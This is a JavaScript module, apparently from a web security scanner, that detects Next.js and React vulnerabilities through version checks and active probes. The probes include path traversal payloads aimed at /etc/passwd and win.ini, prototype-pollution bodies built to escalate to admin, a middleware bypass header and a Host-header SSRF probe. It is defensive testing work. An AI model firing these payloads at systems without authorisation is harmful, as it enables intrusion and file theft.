/**
 * BlueDragon Web Security - React/Next.js Scanners
 * Vulnerability scanners for React ecosystem
 */

import { SEVERITY } from '../../shared/constants.js';
import { generateSafeId } from '../../shared/safety-filters.js';

/**
 * React2Shell Scanner (CVE-2025-55182)
 * Detects and safely probes for Flight protocol RCE
 */
export async function react2shellScanner(context) {
  const { framework, url, settings } = context;
  const results = [];

  // Only applicable to Next.js with RSC
  if (!framework?.hasRSC && framework?.framework !== 'Next.js') {
    return results;
  }

  // Check version first (passive)
  const version = framework.version;
  const isVulnerableVersion = checkVulnerableVersion(version);

  if (isVulnerableVersion === true) {
    results.push({
      type: 'RCE',
      name: 'React2Shell (CVE-2025-55182)',
      severity: SEVERITY.CRITICAL,
      cvss: 10.0,
      cve: 'CVE-2025-55182',
      description: `Next.js ${version} with RSC is vulnerable to unauthenticated RCE via Flight protocol deserialization`,
      url,
      framework: framework.framework,
      version,
      exploitable: true,
      requiresProbe: true,
      indicators: framework.indicators || [],
      remediation: 'Upgrade to Next.js 15.0.5+, 15.1.9+, or 16.0.7+',
      references: [
        'https://nvd.nist.gov/vuln/detail/CVE-2025-55182'
      ]
    });
  } else if (isVulnerableVersion === 'unknown' && framework.hasRSC) {
    results.push({
      type: 'RCE',
      name: 'React2Shell (CVE-2025-55182) - Potential',
      severity: SEVERITY.HIGH,
      cve: 'CVE-2025-55182',
      description: 'RSC detected but version unknown. Application may be vulnerable to React2Shell.',
      url,
      framework: framework.framework,
      requiresProbe: true,
      note: 'Version fingerprinting failed. Manual verification recommended.'
    });
  }

  // If active probing is enabled, send safe probe
  if (settings?.scanMode === 'active' && framework.hasRSC) {
    const probeResult = await probeFlightProtocol(url, context);
    if (probeResult) {
      results.push(probeResult);
    }
  }

  return results;
}

/**
 * Check if version is vulnerable to React2Shell
 */
function checkVulnerableVersion(version) {
  if (!version) return 'unknown';

  const normalizedVersion = version.replace(/[~^]/, '').split('-')[0];
  const parts = normalizedVersion.split('.').map(p => parseInt(p, 10));

  // Vulnerable: 15.0.0-15.0.4, 16.0.0-16.0.6
  if (parts[0] === 15) {
    if (parts[1] === 0 && parts[2] <= 4) return true;
    if (parts[1] === 1 && parts[2] <= 8) return true;
  }

  if (parts[0] === 16) {
    if (parts[1] === 0 && parts[2] <= 6) return true;
  }

  return false;
}

/**
 * Safely probe Flight protocol
 */
async function probeFlightProtocol(url, context) {
  // This is a non-destructive probe that checks for Flight protocol behavior
  // We send a malformed but safe payload that triggers a specific error

  try {
    const probeUrl = new URL(url);

    // Try to find RSC endpoint
    const response = await fetch(probeUrl.toString(), {
      method: 'POST',
      headers: {
        'RSC': '1',
        'Content-Type': 'text/x-component',
        'X-BlueDragon-Probe': generateSafeId()
      },
      body: '0:{"test":true}', // Safe Flight-like payload
      signal: AbortSignal.timeout(5000)
    });

    // Check response for Flight protocol indicators
    const contentType = response.headers.get('content-type') || '';

    if (contentType.includes('text/x-component') || response.status === 500) {
      return {
        type: 'RCE',
        name: 'Flight Protocol Active',
        severity: SEVERITY.MEDIUM,
        description: 'Flight protocol endpoint responds to RSC requests. Further investigation recommended.',
        url,
        probeResult: {
          status: response.status,
          contentType,
          flightActive: true
        },
        note: 'This confirms RSC is active. Check version for CVE-2025-55182.'
      };
    }
  } catch (e) {
    // Timeout or error - endpoint may not support Flight
  }

  return null;
}

/**
 * Server Action SSRF Scanner (CVE-2024-34351)
 * Detects SSRF via Host header in Server Actions
 */
export async function serverActionSSRFScanner(context) {
  const { framework, url, capturedRequests, settings } = context;
  const results = [];

  // Look for Server Actions
  const serverActions = findServerActions(context);

  if (serverActions.length === 0) {
    return results;
  }

  // Report potential vulnerability
  results.push({
    type: 'SSRF',
    name: 'Server Action SSRF (CVE-2024-34351)',
    severity: SEVERITY.HIGH,
    cvss: 7.5,
    cve: 'CVE-2024-34351',
    description: 'Server Actions detected. Host header injection may lead to SSRF in self-hosted deployments.',
    url,
    framework: framework?.framework,
    endpoints: serverActions,
    requiresProbe: true,
    testVector: 'Modify Host header in Server Action POST request',
    note: 'Not exploitable on Vercel-hosted apps due to edge layer.',
    remediation: 'Upgrade Next.js or configure trusted hosts'
  });

  // If active probing with collaborator
  if (settings?.scanMode === 'active' && settings?.collaboratorUrl) {
    const ssrfResult = await probeServerActionSSRF(serverActions, context);
    if (ssrfResult) {
      results.push(ssrfResult);
    }
  }

  return results;
}

/**
 * Find Server Action endpoints
 */
function findServerActions(context) {
  const actions = [];

  // Check captured requests
  for (const req of context.capturedRequests || []) {
    if (req.headers?.['next-action']) {
      actions.push({
        url: req.url,
        method: req.method,
        actionId: req.headers['next-action']
      });
    }
  }

  // Check document for form actions
  if (context.document) {
    const forms = context.document.querySelectorAll('form[action]');
    for (const form of forms) {
      const action = form.getAttribute('action');
      if (action?.includes('$ACTION')) {
        actions.push({
          url: action,
          method: 'POST',
          type: 'form'
        });
      }
    }
  }

  return actions;
}

/**
 * Probe Server Action SSRF with collaborator
 */
async function probeServerActionSSRF(actions, context) {
  if (actions.length === 0 || !context.settings?.collaboratorUrl) {
    return null;
  }

  const collaboratorId = generateSafeId();
  const collaboratorUrl = `${collaboratorId}.${context.settings.collaboratorUrl}`;

  // Try first action
  const action = actions[0];

  try {
    await fetch(action.url, {
      method: 'POST',
      headers: {
        'Host': collaboratorUrl,
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-BlueDragon-Probe': collaboratorId
      },
      body: '',
      credentials: 'omit',
      signal: AbortSignal.timeout(5000)
    });

    // Result will come via collaborator callback
    return {
      type: 'SSRF',
      name: 'Server Action SSRF - Probe Sent',
      severity: SEVERITY.INFO,
      description: `SSRF probe sent with collaborator ID: ${collaboratorId}`,
      url: action.url,
      collaboratorId,
      note: 'Check collaborator for incoming requests'
    };
  } catch (e) {
    return null;
  }
}

/**
 * Image Optimization DoS Scanner (CVE-2024-47831)
 */
export async function imageDoSScanner(context) {
  const { framework, url } = context;
  const results = [];

  if (framework?.framework !== 'Next.js') {
    return results;
  }

  // Check for image optimization endpoint
  try {
    const imageUrl = new URL('/_next/image', url);
    imageUrl.searchParams.set('url', 'https://example.com/test.png');
    imageUrl.searchParams.set('w', '64');
    imageUrl.searchParams.set('q', '75');

    const response = await fetch(imageUrl.toString(), {
      method: 'HEAD',
      signal: AbortSignal.timeout(5000)
    });

    if (response.status !== 404) {
      // Check if external URLs are allowed
      const externalTest = new URL('/_next/image', url);
      externalTest.searchParams.set('url', 'https://httpbin.org/image/png');
      externalTest.searchParams.set('w', '64');
      externalTest.searchParams.set('q', '75');

      const externalResponse = await fetch(externalTest.toString(), {
        method: 'HEAD',
        signal: AbortSignal.timeout(5000)
      });

      if (externalResponse.ok) {
        results.push({
          type: 'DoS',
          name: 'Image Optimization External URL (CVE-2024-47831)',
          severity: SEVERITY.MEDIUM,
          cvss: 5.3,
          cve: 'CVE-2024-47831',
          description: 'Image optimization endpoint accepts external URLs. May be vulnerable to resource exhaustion.',
          url: imageUrl.toString(),
          endpoint: '/_next/image',
          externalUrls: true,
          remediation: 'Configure images.domains in next.config.js to allowlist specific domains'
        });
      } else {
        results.push({
          type: 'Configuration',
          name: 'Image Optimization Endpoint',
          severity: SEVERITY.LOW,
          description: 'Image optimization endpoint exists but external URLs appear restricted.',
          url: imageUrl.toString(),
          endpoint: '/_next/image'
        });
      }
    }
  } catch (e) {
    // Endpoint not accessible
  }

  return results;
}

/**
 * Next.js Middleware Authorization Bypass Scanner (CVE-2025-29927)
 * Detects vulnerability to x-middleware-subrequest header bypass
 */
export async function middlewareBypassScanner(context) {
  const { framework, url, settings } = context;
  const results = [];

  if (framework?.framework !== 'Next.js') {
    return results;
  }

  // Check version first
  const version = framework.version;
  const isVulnerableVersion = checkMiddlewareBypassVersion(version);

  if (isVulnerableVersion === true) {
    results.push({
      type: 'AUTH_BYPASS',
      name: 'Next.js Middleware Authorization Bypass (CVE-2025-29927)',
      severity: SEVERITY.CRITICAL,
      cvss: 9.1,
      cve: 'CVE-2025-29927',
      description: `Next.js ${version} is vulnerable to middleware authorization bypass via x-middleware-subrequest header`,
      url,
      framework: framework.framework,
      version,
      exploitable: true,
      requiresProbe: true,
      testVector: 'Add x-middleware-subrequest: 1 header to bypass middleware checks',
      indicators: framework.indicators || [],
      remediation: 'Upgrade to Next.js 12.3.5+, 13.5.9+, 14.2.25+, or 15.2.3+',
      references: [
        'https://nvd.nist.gov/vuln/detail/CVE-2025-29927',
        'https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw'
      ]
    });
  }

  // Active probe if enabled
  if (settings?.scanMode === 'active') {
    const probeResult = await probeMiddlewareBypass(url, context);
    if (probeResult) {
      results.push(probeResult);
    }
  }

  return results;
}

/**
 * Check if version is vulnerable to middleware bypass
 */
function checkMiddlewareBypassVersion(version) {
  if (!version) return 'unknown';

  const normalizedVersion = version.replace(/[~^]/, '').split('-')[0];
  const parts = normalizedVersion.split('.').map(p => parseInt(p, 10));

  // Vulnerable: 11.1.4-12.3.4, 13.0.0-13.5.8, 14.0.0-14.2.24, 15.0.0-15.2.2
  if (parts[0] === 11 && parts[1] >= 1) return true;
  if (parts[0] === 12 && (parts[1] < 3 || (parts[1] === 3 && parts[2] <= 4))) return true;
  if (parts[0] === 13 && (parts[1] < 5 || (parts[1] === 5 && parts[2] <= 8))) return true;
  if (parts[0] === 14 && (parts[1] < 2 || (parts[1] === 2 && parts[2] <= 24))) return true;
  if (parts[0] === 15 && (parts[1] < 2 || (parts[1] === 2 && parts[2] <= 2))) return true;

  return false;
}

/**
 * Probe for middleware bypass
 */
async function probeMiddlewareBypass(url, context) {
  try {
    // Try common protected paths
    const protectedPaths = ['/admin', '/dashboard', '/api/admin', '/settings', '/profile'];
    const probeId = generateSafeId();

    for (const path of protectedPaths) {
      const testUrl = new URL(path, url);

      // Request without bypass header
      const normalResponse = await fetch(testUrl.toString(), {
        method: 'GET',
        redirect: 'manual',
        signal: AbortSignal.timeout(5000)
      });

      // Request with bypass header
      const bypassResponse = await fetch(testUrl.toString(), {
        method: 'GET',
        headers: {
          'x-middleware-subrequest': '1',
          'X-BlueDragon-Probe': probeId
        },
        redirect: 'manual',
        signal: AbortSignal.timeout(5000)
      });

      // Check if bypass worked
      if (normalResponse.status !== bypassResponse.status) {
        // Different status indicates potential bypass
        if ((normalResponse.status === 302 || normalResponse.status === 401 || normalResponse.status === 403) &&
            (bypassResponse.status === 200 || bypassResponse.status === 304)) {
          return {
            type: 'AUTH_BYPASS',
            name: 'Middleware Bypass Confirmed',
            severity: SEVERITY.CRITICAL,
            cve: 'CVE-2025-29927',
            description: `Middleware authorization bypass confirmed on ${path}`,
            url: testUrl.toString(),
            probeResult: {
              normalStatus: normalResponse.status,
              bypassStatus: bypassResponse.status,
              path
            },
            exploitable: true
          };
        }
      }
    }
  } catch (e) {
    // Probe failed
  }

  return null;
}

/**
 * React Source Code Exposure Scanner (CVE-2025-55183)
 * Detects potential server source code exposure via RSC responses
 */
export async function sourceCodeExposureScanner(context) {
  const { framework, url, settings } = context;
  const results = [];

  // Only applicable to RSC frameworks
  if (!framework?.hasRSC) {
    return results;
  }

  const version = framework.version;
  const isVulnerableVersion = checkSourceExposureVersion(version);

  if (isVulnerableVersion === true || isVulnerableVersion === 'unknown') {
    results.push({
      type: 'SOURCE_EXPOSURE',
      name: 'React Source Code Exposure (CVE-2025-55183)',
      severity: SEVERITY.MEDIUM,
      cvss: 5.3,
      cve: 'CVE-2025-55183',
      description: 'Server source code may be exposed via RSC Flight protocol responses',
      url,
      framework: framework.framework,
      version,
      requiresProbe: true,
      note: 'Check RSC responses for server-side code leakage',
      remediation: 'Upgrade React to 19.1.1+ or Next.js to patched version'
    });
  }

  return results;
}

/**
 * Check if version is vulnerable to source code exposure
 */
function checkSourceExposureVersion(version) {
  if (!version) return 'unknown';

  const normalizedVersion = version.replace(/[~^]/, '').split('-')[0];
  const parts = normalizedVersion.split('.').map(p => parseInt(p, 10));

  // React 19.0.0-19.1.0
  if (parts[0] === 19 && parts[1] <= 1 && parts[2] === 0) return true;

  return false;
}

/**
 * React DoS Scanner (CVE-2025-55184 & CVE-2025-67779)
 * Detects DoS vulnerability via malformed RSC payloads
 */
export async function reactDoSScanner(context) {
  const { framework, url } = context;
  const results = [];

  // Only applicable to RSC frameworks
  if (!framework?.hasRSC) {
    return results;
  }

  const version = framework.version;

  // CVE-2025-55184: React 19.0.0-19.1.0
  if (checkReactDoSVersion(version, '55184') === true) {
    results.push({
      type: 'DoS',
      name: 'React DoS via Infinite Loop (CVE-2025-55184)',
      severity: SEVERITY.HIGH,
      cvss: 7.5,
      cve: 'CVE-2025-55184',
      description: 'Malformed RSC payload can cause infinite loop and server hang',
      url,
      framework: framework.framework,
      version,
      note: 'Server can be crashed with crafted Flight protocol payload',
      remediation: 'Upgrade React to 19.1.1+'
    });
  }

  // CVE-2025-67779: React 19.1.0 (incomplete fix)
  if (checkReactDoSVersion(version, '67779') === true) {
    results.push({
      type: 'DoS',
      name: 'React DoS Incomplete Fix (CVE-2025-67779)',
      severity: SEVERITY.HIGH,
      cvss: 7.5,
      cve: 'CVE-2025-67779',
      description: 'Incomplete fix for CVE-2025-55184, still exploitable via different payload',
      url,
      framework: framework.framework,
      version,
      note: 'React 19.1.0 patch was incomplete',
      remediation: 'Upgrade React to latest patched version'
    });
  }

  return results;
}

/**
 * Check React DoS vulnerability by version
 */
function checkReactDoSVersion(version, cve) {
  if (!version) return 'unknown';

  const normalizedVersion = version.replace(/[~^]/, '').split('-')[0];
  const parts = normalizedVersion.split('.').map(p => parseInt(p, 10));

  if (cve === '55184') {
    // React 19.0.0-19.1.0
    if (parts[0] === 19 && parts[1] <= 1 && parts[2] === 0) return true;
  }

  if (cve === '67779') {
    // React 19.1.0 specifically
    if (parts[0] === 19 && parts[1] === 1 && parts[2] === 0) return true;
  }

  return false;
}

/**
 * Path Traversal Scanner for File-Serving API Routes
 * Detects insecure path.join() usage with user input allowing arbitrary file read
 */
export async function pathTraversalScanner(context) {
  const { framework, url, settings, capturedRequests } = context;
  const results = [];

  // Only run in active mode - this requires probing
  if (settings?.scanMode !== 'active') {
    return results;
  }

  // Common API route patterns that might serve files
  const fileServingEndpoints = [
    '/api/image',
    '/api/file',
    '/api/download',
    '/api/asset',
    '/api/media',
    '/api/static',
    '/api/serve',
    '/api/get-file',
    '/api/fetch-file',
    '/api/read',
    '/api/load'
  ];

  // Also check captured requests for endpoints with path/file parameters
  const discoveredEndpoints = discoverFileEndpoints(capturedRequests || []);
  const allEndpoints = [...new Set([...fileServingEndpoints, ...discoveredEndpoints])];

  // Path traversal payloads
  const traversalPayloads = [
    { param: 'path', value: '../../../../etc/passwd' },
    { param: 'file', value: '../../../../etc/passwd' },
    { param: 'filename', value: '../../../../etc/passwd' },
    { param: 'src', value: '../../../../etc/passwd' },
    { param: 'path', value: '....//....//....//....//etc/passwd' },
    { param: 'path', value: '..%2F..%2F..%2F..%2Fetc%2Fpasswd' },
    { param: 'path', value: '..\\..\\..\\..\\etc\\passwd' }
  ];

  // Indicators of successful /etc/passwd read
  const passwdIndicators = ['root:', 'nobody:', 'daemon:', '/bin/bash', '/bin/sh', '/nix/store', ':x:'];

  for (const endpoint of allEndpoints) {
    for (const payload of traversalPayloads) {
      try {
        const testUrl = new URL(endpoint, url);
        testUrl.searchParams.set(payload.param, payload.value);

        const response = await fetch(testUrl.toString(), {
          method: 'GET',
          headers: {
            'X-BlueDragon-Probe': generateSafeId()
          },
          signal: AbortSignal.timeout(5000)
        });

        if (!response.ok) continue;

        const text = await response.text();
        const matchedIndicators = passwdIndicators.filter(ind => text.includes(ind));

        if (matchedIndicators.length >= 2) {
          // High confidence - multiple passwd indicators found
          results.push({
            type: 'PATH_TRAVERSAL',
            name: 'Path Traversal - Arbitrary File Read',
            severity: SEVERITY.CRITICAL,
            cvss: 7.5,
            description: `Path traversal vulnerability allows reading arbitrary files. Successfully read /etc/passwd via ${endpoint}`,
            url: testUrl.toString(),
            framework: framework?.framework,
            exploitable: true,
            endpoint,
            payload: `${payload.param}=${payload.value}`,
            evidence: text.substring(0, 500),
            matchedIndicators,
            remediation: 'Sanitize path input: use path.basename(), validate against allowlist, or use path.resolve() with directory containment check',
            references: [
              'https://owasp.org/www-community/attacks/Path_Traversal'
            ]
          });

          // Found vulnerability on this endpoint, skip other payloads
          break;
        }
      } catch (e) {
        // Endpoint doesn't exist or timed out
      }
    }
  }

  // Also try to detect Windows systems
  if (results.length === 0) {
    for (const endpoint of allEndpoints.slice(0, 3)) {
      try {
        const testUrl = new URL(endpoint, url);
        testUrl.searchParams.set('path', '..\\..\\..\\..\\windows\\win.ini');

        const response = await fetch(testUrl.toString(), {
          method: 'GET',
          signal: AbortSignal.timeout(5000)
        });

        if (!response.ok) continue;

        const text = await response.text();
        if (text.includes('[fonts]') || text.includes('[extensions]')) {
          results.push({
            type: 'PATH_TRAVERSAL',
            name: 'Path Traversal - Arbitrary File Read (Windows)',
            severity: SEVERITY.CRITICAL,
            cvss: 7.5,
            description: `Path traversal vulnerability on Windows server. Successfully read win.ini via ${endpoint}`,
            url: testUrl.toString(),
            framework: framework?.framework,
            exploitable: true,
            endpoint,
            payload: 'path=..\\..\\..\\..\\windows\\win.ini',
            evidence: text.substring(0, 500),
            remediation: 'Sanitize path input: use path.basename(), validate against allowlist, or use path.resolve() with directory containment check'
          });
          break;
        }
      } catch (e) {
        // Continue
      }
    }
  }

  return results;
}

/**
 * Discover file-serving endpoints from captured requests
 */
function discoverFileEndpoints(requests) {
  const endpoints = [];
  const fileParams = ['path', 'file', 'filename', 'src', 'image', 'asset', 'download'];

  for (const req of requests) {
    try {
      const reqUrl = new URL(req.url);

      // Check if any file-related params exist
      for (const param of fileParams) {
        if (reqUrl.searchParams.has(param)) {
          // Extract base endpoint without query params
          endpoints.push(reqUrl.pathname);
          break;
        }
      }

      // Check for /api/ routes that might serve files
      if (reqUrl.pathname.includes('/api/') &&
          (reqUrl.pathname.includes('image') ||
           reqUrl.pathname.includes('file') ||
           reqUrl.pathname.includes('download') ||
           reqUrl.pathname.includes('asset'))) {
        endpoints.push(reqUrl.pathname);
      }
    } catch (e) {
      // Invalid URL
    }
  }

  return [...new Set(endpoints)];
}

/**
 * Server Action Prototype Pollution Scanner
 * Detects auth bypass via __proto__ injection in Object.assign/spread patterns
 */
export async function serverActionPrototypePollutionScanner(context) {
  const { framework, url, settings, capturedRequests } = context;
  const results = [];

  // Only run in active mode
  if (settings?.scanMode !== 'active') {
    return results;
  }

  // Common API route patterns for auth/user operations
  const authEndpoints = [
    '/api/test-action',
    '/api/auth',
    '/api/login',
    '/api/user',
    '/api/admin',
    '/api/profile',
    '/api/account',
    '/api/settings',
    '/api/permissions',
    '/api/roles'
  ];

  // Discover additional JSON endpoints from captured requests
  const discoveredEndpoints = discoverJsonEndpoints(capturedRequests || []);
  const allEndpoints = [...new Set([...authEndpoints, ...discoveredEndpoints])];

  // Prototype pollution payloads targeting auth bypass
  const pollutionPayloads = [
    {
      name: '__proto__ isAdmin bypass',
      payload: { "__proto__": { "isAdmin": true }, "username": "test" }
    },
    {
      name: '__proto__ role escalation',
      payload: { "__proto__": { "role": "admin" }, "username": "test" }
    },
    {
      name: '__proto__ authenticated bypass',
      payload: { "__proto__": { "authenticated": true, "isAuthenticated": true }, "username": "test" }
    },
    {
      name: 'constructor.prototype pollution',
      payload: { "constructor": { "prototype": { "isAdmin": true } }, "username": "test" }
    },
    {
      name: '__proto__ permissions array',
      payload: { "__proto__": { "permissions": ["admin", "write", "delete"] }, "username": "test" }
    }
  ];

  // Indicators of successful auth bypass
  const bypassIndicators = [
    'admin', 'secret', 'granted', 'authorized', 'success',
    'private', 'internal', 'confidential', 'API_KEY', 'SECRET',
    'users', 'database', 'credentials', 'token', 'jwt'
  ];

  for (const endpoint of allEndpoints) {
    // First, establish baseline with normal request
    let baselineResponse = null;
    let baselineBody = '';

    try {
      const baselineUrl = new URL(endpoint, url);
      baselineResponse = await fetch(baselineUrl.toString(), {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-BlueDragon-Probe': generateSafeId()
        },
        body: JSON.stringify({ username: 'test' }),
        signal: AbortSignal.timeout(5000)
      });
      baselineBody = await baselineResponse.text();
    } catch (e) {
      // Endpoint doesn't exist or doesn't accept POST
      continue;
    }

    // Now test with pollution payloads
    for (const { name, payload } of pollutionPayloads) {
      try {
        const testUrl = new URL(endpoint, url);
        const probeId = generateSafeId();

        const response = await fetch(testUrl.toString(), {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-BlueDragon-Probe': probeId
          },
          body: JSON.stringify(payload),
          signal: AbortSignal.timeout(5000)
        });

        const body = await response.text();

        // Check for auth bypass indicators
        const foundIndicators = bypassIndicators.filter(ind =>
          body.toLowerCase().includes(ind.toLowerCase()) &&
          !baselineBody.toLowerCase().includes(ind.toLowerCase())
        );

        // Check for significant response differences
        const statusChanged = baselineResponse && response.status !== baselineResponse.status;
        const responseLengthDiff = Math.abs(body.length - baselineBody.length);
        const significantLengthChange = responseLengthDiff > 100;

        // High confidence: found sensitive data not in baseline
        if (foundIndicators.length >= 2 || (foundIndicators.length >= 1 && significantLengthChange)) {
          results.push({
            type: 'PROTOTYPE_POLLUTION',
            name: 'Server Action Prototype Pollution - Auth Bypass',
            severity: SEVERITY.CRITICAL,
            cvss: 8.1,
            description: `Prototype pollution via ${name} bypasses authorization. Sensitive data exposed.`,
            url: testUrl.toString(),
            framework: framework?.framework,
            exploitable: true,
            endpoint,
            payload: JSON.stringify(payload),
            evidence: body.substring(0, 500),
            foundIndicators,
            statusChange: statusChanged ? { baseline: baselineResponse?.status, polluted: response.status } : null,
            remediation: 'Use Object.create(null), filter __proto__/constructor properties, or use hasOwnProperty for auth checks',
            references: [
              'https://portswigger.net/web-security/prototype-pollution'
            ]
          });

          // Found vulnerability, skip other payloads for this endpoint
          break;
        }

        // Medium confidence: status code changed from denied to success
        if (statusChanged &&
            (baselineResponse.status === 401 || baselineResponse.status === 403) &&
            (response.status === 200)) {
          results.push({
            type: 'PROTOTYPE_POLLUTION',
            name: 'Server Action Prototype Pollution - Potential Auth Bypass',
            severity: SEVERITY.HIGH,
            cvss: 7.5,
            description: `Prototype pollution via ${name} changed response status from ${baselineResponse.status} to ${response.status}`,
            url: testUrl.toString(),
            framework: framework?.framework,
            exploitable: true,
            endpoint,
            payload: JSON.stringify(payload),
            statusChange: { baseline: baselineResponse.status, polluted: response.status },
            note: 'Status code changed from denied to success - verify manually',
            remediation: 'Use Object.create(null), filter __proto__/constructor properties'
          });
          break;
        }

        // Low confidence: server error on pollution attempt (may indicate processing)
        if (response.status === 500 && baselineResponse?.status !== 500) {
          results.push({
            type: 'PROTOTYPE_POLLUTION',
            name: 'Server Action Prototype Pollution - Server Error',
            severity: SEVERITY.MEDIUM,
            description: `Server error when sending ${name} payload. May indicate vulnerability.`,
            url: testUrl.toString(),
            framework: framework?.framework,
            endpoint,
            payload: JSON.stringify(payload),
            responseStatus: response.status,
            note: 'Server crashed or threw error on prototype pollution attempt - investigate manually'
          });
        }
      } catch (e) {
        // Request failed
      }
    }
  }

  // Also test Server Actions directly if we found any
  const serverActions = findServerActionEndpoints(capturedRequests || []);
  for (const action of serverActions.slice(0, 5)) {
    for (const { name, payload } of pollutionPayloads.slice(0, 2)) {
      try {
        const probeId = generateSafeId();

        const response = await fetch(action.url, {
          method: 'POST',
          headers: {
            'Content-Type': 'text/plain;charset=UTF-8',
            'Next-Action': action.actionId || '',
            'X-BlueDragon-Probe': probeId
          },
          body: JSON.stringify([payload]),
          signal: AbortSignal.timeout(5000)
        });

        const body = await response.text();
        const foundIndicators = bypassIndicators.filter(ind =>
          body.toLowerCase().includes(ind.toLowerCase())
        );

        if (foundIndicators.length >= 1) {
          results.push({
            type: 'PROTOTYPE_POLLUTION',
            name: 'Server Action Prototype Pollution - Direct Action',
            severity: SEVERITY.HIGH,
            cvss: 7.5,
            description: `Prototype pollution in Server Action via ${name}`,
            url: action.url,
            framework: framework?.framework,
            exploitable: true,
            actionId: action.actionId,
            payload: JSON.stringify(payload),
            foundIndicators,
            note: 'Direct Server Action injection successful',
            remediation: 'Sanitize input in Server Actions before using Object.assign or spread operator'
          });
          break;
        }
      } catch (e) {
        // Request failed
      }
    }
  }

  return results;
}

/**
 * Discover JSON API endpoints from captured requests
 */
function discoverJsonEndpoints(requests) {
  const endpoints = [];

  for (const req of requests) {
    try {
      const contentType = req.headers?.['content-type'] || '';
      if (contentType.includes('application/json') &&
          (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH')) {
        const reqUrl = new URL(req.url);
        endpoints.push(reqUrl.pathname);
      }
    } catch (e) {
      // Invalid URL
    }
  }

  return [...new Set(endpoints)];
}

/**
 * Find Server Action endpoints from captured requests
 */
function findServerActionEndpoints(requests) {
  const actions = [];

  for (const req of requests) {
    if (req.headers?.['next-action']) {
      actions.push({
        url: req.url,
        actionId: req.headers['next-action']
      });
    }
  }

  return actions;
}

export default {
  react2shellScanner,
  serverActionSSRFScanner,
  imageDoSScanner,
  middlewareBypassScanner,
  sourceCodeExposureScanner,
  reactDoSScanner,
  pathTraversalScanner,
  serverActionPrototypePollutionScanner
};
